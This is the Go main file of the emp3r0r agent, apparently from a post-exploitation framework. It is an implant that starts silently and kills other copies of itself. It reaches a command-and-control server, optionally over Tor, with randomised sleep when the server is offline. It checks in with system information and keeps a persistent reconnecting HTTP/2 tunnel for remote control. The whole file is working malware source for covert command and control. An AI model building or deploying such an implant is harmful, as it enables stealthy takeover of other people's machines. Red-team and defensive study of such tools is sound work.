package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

func main() {
	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
	silent := flag.Bool("silent", true, "Show logs or not")
	flag.Parse()

	// silent switch
	log.SetOutput(ioutil.Discard)
	if !*silent {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)
	}

	// kill any running agents
	alive, procs := agent.IsProcAlive("emp3r0r")
	if alive {
		for _, proc := range procs {
			if proc.Pid == os.Getpid() {
				continue
			}
			err := proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}
	// if the agent's process name is not "emp3r0r"
	alive, pid := agent.IsAgentRunning()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}
		err = proc.Kill()
		if err != nil {
			log.Println("Failed to kill old emp3r0r", err)
		}
	}

	// parse C2 address
	ccip := strings.Split(agent.CCAddress, "/")[2]
	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
	if tun.ValidateIP(ccip) {
		agent.CCAddress = fmt.Sprintf("%s:%s/", agent.CCAddress, agent.CCPort)
	} else {
		agent.CCAddress += "/"
	}

	// if CC is behind tor, a proxy is needed
	agent.HTTPClient = tun.EmpHTTPClient("")
	if tun.IsTor(agent.CCAddress) {
		log.Printf("CC is on TOR: %s", agent.CCAddress)
		if *c2proxy == "" {
			log.Fatalf("CC is on TOR (%s), you have to specify a tor proxy for it to work", agent.CCAddress)
		}
		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
	}
connect:

	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if !agent.IsCCOnline() {
		log.Println("CC not online")
		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
	}

	// check in with system info
	err := agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Printf("Checked in on CC: %s", agent.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := agent.CCAddress + tun.MsgAPI
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	agent.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	err = agent.CCMsgTun(ctx, cancel)
	if err != nil {
		log.Printf("CCMsgTun: %v, reconnecting...", err)
	}
	goto connect
}
